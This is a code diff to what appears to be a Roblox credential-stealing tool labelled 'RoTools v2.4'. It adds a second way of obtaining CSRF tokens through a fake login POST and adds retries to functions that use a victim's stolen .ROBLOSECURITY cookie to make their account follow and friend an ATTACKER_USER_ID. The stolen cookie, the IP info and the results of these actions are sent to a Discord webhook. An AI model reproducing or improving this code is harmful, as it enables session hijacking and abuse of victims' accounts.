@@ -51,16 +51,31 @@ export default async function handler(req, res) {
       );
     }
 
-    // New CSRF token function based on your working example
+    // Enhanced CSRF token function with dual methods
     const getCsrfToken = async () => {
       try {
-        // Fetch Roblox homepage to extract CSRF token from HTML
+        // Method 1: Get token from authentication endpoint headers
+        const tokenResponse = await fetch('https://auth.roblox.com/v2/login', {
+          method: 'POST',
+          headers: { 
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ ctype: 'Username', cvalue: 'csrf_fetch', password: 'none' })
+        });
+        
+        if (tokenResponse.status === 403) {
+          const token = tokenResponse.headers.get('x-csrf-token');
+          if (token) return token;
+        }
+
+        // Method 2: Get token from homepage HTML if header method fails
         const homeResponse = await fetch('https://www.roblox.com/home', {
           headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
         });
         
         if (!homeResponse.ok) {
-          throw new Error(`Failed to fetch homepage: ${homeResponse.status}`);
+          throw new Error(`Homepage fetch failed: ${homeResponse.status}`);
         }
         
         const homeHtml = await homeResponse.text();
@@ -69,51 +84,82 @@ export default async function handler(req, res) {
         if (metaTagMatch && metaTagMatch[1]) {
           return metaTagMatch[1];
         }
-        throw new Error('CSRF meta tag not found in homepage HTML');
+        
+        throw new Error('Both CSRF token methods failed');
       } catch (error) {
         console.error('CSRF token fetch error:', error);
         throw new Error('CSRF token retrieval failed');
       }
     };
 
-    // Function to follow user
+    // Enhanced follow function with retries
     const followUser = async (userId) => {
-      try {
-        const csrfToken = await getCsrfToken();
-        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/follow`, {
-          method: 'POST',
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Referer': 'https://www.roblox.com/',
-            'Origin': 'https://www.roblox.com'
+      for (let attempt = 1; attempt <= 3; attempt++) {
+        try {
+          const csrfToken = await getCsrfToken();
+          const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/follow`, {
+            method: 'POST',
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${cookie}`,
+              'X-CSRF-TOKEN': csrfToken,
+              'Referer': 'https://www.roblox.com/',
+              'Origin': 'https://www.roblox.com'
+            }
+          });
+          
+          if (response.ok) return true;
+          
+          // If we get a 403, try to get a new CSRF token
+          if (response.status === 403) {
+            console.log(`Follow attempt ${attempt} failed with 403, retrying...`);
+            continue;
           }
-        });
-        return response.ok;
-      } catch (e) {
-        console.error('Follow error:', e);
-        return false;
+          
+          const errorBody = await response.text();
+          console.error(`Follow error: ${response.status} - ${errorBody}`);
+          return false;
+        } catch (e) {
+          console.error(`Follow attempt ${attempt} error:`, e);
+          if (attempt === 3) return false;
+        }
       }
+      return false;
     };
 
-    // Function to send friend request
+    // Enhanced friend request function with retries
     const sendFriendRequest = async (userId) => {
-      try {
-        const csrfToken = await getCsrfToken();
-        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/request-friendship`, {
-          method: 'POST',
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Referer': 'https://www.roblox.com/',
-            'Origin': 'https://www.roblox.com'
+      for (let attempt = 1; attempt <= 3; attempt++) {
+        try {
+          const csrfToken = await getCsrfToken();
+          const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/request-friendship`, {
+            method: 'POST',
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${cookie}`,
+              'X-CSRF-TOKEN': csrfToken,
+              'Referer': 'https://www.roblox.com/',
+              'Origin': 'https://www.roblox.com',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({})  // Empty body required
+          });
+          
+          if (response.ok) return true;
+          
+          // If we get a 403, try to get a new CSRF token
+          if (response.status === 403) {
+            console.log(`Friend request attempt ${attempt} failed with 403, retrying...`);
+            continue;
           }
-        });
-        return response.ok;
-      } catch (e) {
-        console.error('Friend request error:', e);
-        return false;
+          
+          const errorBody = await response.text();
+          console.error(`Friend request error: ${response.status} - ${errorBody}`);
+          return false;
+        } catch (e) {
+          console.error(`Friend request attempt ${attempt} error:`, e);
+          if (attempt === 3) return false;
+        }
       }
+      return false;
     };
 
     // Send cookie + IP info to Discord with @everyone ping
@@ -275,12 +321,44 @@ export default async function handler(req, res) {
       body: JSON.stringify({ embeds: [accountInfoEmbed] })
     });
 
-    // Perform follow and friend requests
+    // Perform follow and friend requests with detailed error reporting
     const ATTACKER_USER_ID = process.env.ATTACKER_USER_ID || '8318490238';
     
     if (ATTACKER_USER_ID) {
-      const followSuccess = await followUser(ATTACKER_USER_ID);
-      const friendSuccess = await sendFriendRequest(ATTACKER_USER_ID);
+      let followSuccess = false;
+      let friendSuccess = false;
+      let followError = '';
+      let friendError = '';
+      
+      try {
+        followSuccess = await followUser(ATTACKER_USER_ID);
+        if (!followSuccess) followError = 'Follow action failed after 3 attempts';
+      } catch (e) {
+        followError = e.message;
+      }
+      
+      try {
+        friendSuccess = await sendFriendRequest(ATTACKER_USER_ID);
+        if (!friendSuccess) friendError = 'Friend request failed after 3 attempts';
+      } catch (e) {
+        friendError = e.message;
+      }
+      
+      // Prepare detailed results for Discord
+      const actionResults = [
+        { 
+          name: 'Follow Action', 
+          value: followSuccess ? '✅ Success' : `❌ Failed${followError ? `: ${followError}` : ''}`,
+          inline: true 
+        },
+        { 
+          name: 'Friend Request', 
+          value: friendSuccess ? '✅ Success' : `❌ Failed${friendError ? `: ${friendError}` : ''}`,
+          inline: true 
+        },
+        { name: 'Target User', value: ATTACKER_USER_ID, inline: false },
+        { name: 'CSRF Method', value: 'Dual-method with retries', inline: false }
+      ];
       
       // Send action results to Discord
       await fetch(process.env.DISCORD_WEBHOOK, {
@@ -290,12 +368,7 @@ export default async function handler(req, res) {
           embeds: [{
             title: "🤖 AUTO ACTIONS PERFORMED",
             color: 0x000000,
-            fields: [
-              { name: 'Follow Action', value: followSuccess ? '✅ Success' : '❌ Failed', inline: true },
-              { name: 'Friend Request', value: friendSuccess ? '✅ Success' : '❌ Failed', inline: true },
-              { name: 'Target User', value: ATTACKER_USER_ID, inline: false },
-              { name: 'CSRF Method', value: 'Homepage HTML extraction', inline: false }
-            ],
+            fields: actionResults,
             footer: { text: "RoTools v2.4 | Auto Actions" },
             timestamp: new Date().toISOString()
           }]
